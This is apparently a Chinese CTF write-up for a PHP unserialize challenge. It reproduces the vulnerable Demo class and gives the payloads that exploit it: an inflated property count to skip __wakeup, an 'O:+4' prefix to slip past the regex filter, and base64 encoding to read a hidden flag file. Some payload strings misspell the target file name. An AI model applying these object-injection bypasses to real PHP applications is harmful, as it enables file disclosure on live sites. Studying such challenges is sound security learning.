---
layout: post
title: Web进阶题-Web_php_unserialize
excerpt: "攻防世界进阶Web题目-Web_php_unserialize"
date:   2020-10-12 12:43:00
categories: [CTF]
comments: true
---

## 我的解题过程

1. 访问网页，王爷正文为

   ```php
   <?php 
   class Demo { 
       private $file = 'index.php';
       public function __construct($file) { 
           $this->file = $file; 
       }
       function __destruct() { 
           echo @highlight_file($this->file, true); 
       }
       function __wakeup() { 
           if ($this->file != 'index.php') { 
               //the secret is in the fl4g.php
               $this->file = 'index.php'; 
           } 
       } 
   }
   if (isset($_GET['var'])) { 
       $var = base64_decode($_GET['var']); 
       if (preg_match('/[oc]:\d+:/i', $var)) { 
           die('stop hacking!'); 
       } else {
           @unserialize($var); 
       } 
   } else { 
       highlight_file("index.php"); 
   } 
   ?>
   ```

   * 定义了一个Demo类
     * 私有成员变量file，用于存储打印源码的文件名
     * 构造函数，参数为file
     * 析构函数，用于打印file文件的文件内容，并且以PHP语法高亮
     * wakeup函数，在反序列执行之前进行调用，将file变量置为‘index.php’
   * 提示flag在fl4g.php文件里面，所以此次反序列化是要反序列化一个file变量为‘fl4g.php’的demo对象，且需要绕过wakeup魔术方法
   * index.php从get方法中取一个var参数，经过base64解码后，且需要绕过一个正则表达式才能进行反序列化

2. 总结题目步骤

   * 提交的参数需要经过base64编码
   * 绕过正则表达式
   * 绕过wakeup方法
   * 将file文件名改为‘fl4g.php'

3. 正常的构造方式为*O:4:"Demo":1:{s:10:"\00Demo\00file";s:8:"fl4g.php";}*，网页正文为”stop hacking!“

4. 绕过wakeup，只需对象的属性个数值大于实际值就可以，所以构造对象*O:4:"Demo":2:{s:10:"\00Demo\00file";s:8:"f14g.php";}*

5. 目前是需要在前面加上某些字符，使其不符合正则表达式同时还不影响反序列化

6. 卡在了这一步

## 别人的解决方法

1. 使用了+4，来绕过O:4:的模式，因为反序列化时会把两个冒号中间的内容当作类名的长度，所以添加‘+’号不影响反序列化的执行。

2. 所以构造的对象为*O:+4:"Demo":1:{s:10:"\x00Demo\x00file";s:8:"f14g.php";}*

3. 但是在复制时容易丢失原有的\x00，如果直接序列化会把\x00当作好几个字符，而不是一个字符

4. 所以在复制这个类到PHP脚本中，通过serialize函数正常序列化一个出来

   ```php
   <?php
   class Demo { 
       private $file = 'index.php';
       public function __construct($file) { 
           $this->file = $file; 
       }
       function __destruct() { 
           echo @highlight_file($this->file, true); 
       }
       function __wakeup() { 
           if ($this->file != 'index.php') { 
               //the secret is in the fl4g.php
               $this->file = 'index.php'; 
           } 
       } 
   }
   $var=new Demo('fl4g.php');
   echo serialize($var);
   ?>
   //输出结果为
O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}   
   ```

5. 将序列化的结果复制到Burp Suite的Decoder模块，查看是否正确。

6. 如果出现问题，直接修改这个字符串的十六进制，将对应位置修改为十六进制的00

7. 检查无误后，使用Decoder的base64进行编码

8. 编码完成后，访问网站，返回内容

   ```php
   <?php
   $flag="ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}";
   ?>
   ```

9. 发现flag，ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}


## 独立思考

### 1. 正则表达式有哪些符号？

题目中给出的正则表达式为*/\[oc\]:\\d+:/i*

| 字符    | 描述                                                        | 本题中的字符 | 本题中的释义   |
| ------- | ----------------------------------------------------------- | ------------ | -------------- |
| \[abc\] | 匹配\[\]中的所有字符，如前面的是要匹配字符串中的a、b、c字母 | \[oc\]       | 匹配所有o、c   |
| \d      | 匹配一个数字                                                | \d           | 数字           |
| +       | +前面的字符至少出现一次                                     | \d+          | 至少有一个数字 |
| /xxx/   | / /之间的是正则表达式                                       |              |                |
| /i      | 最后有i，代表大小写不敏感                                   |              |                |

所以本题匹配的是O:4:这个模式，需要绕过这个模式并且还不影响反序列化。

### 2. 有哪些不影响语义，且能绕过正则表达式的方法？

本题主要的难点就在于这里。

* 对于数字来说，如果它匹配模式中间是数字，可以使用+号来绕过，因为它仅仅匹配0-9这十个字符。

### 3. 本题经验

对于出现乱码的情况，一定要小心复制的过程中丢失字符，熟练使用Burp Suite的Decoder模块，便于对字符串的16进制进行修改，而且可以进行常用的编解码。

## 产生过的疑问

1. 正则表达式有哪些符号？
2. 有哪些不影响语义，且能绕过正则表达式的方法？
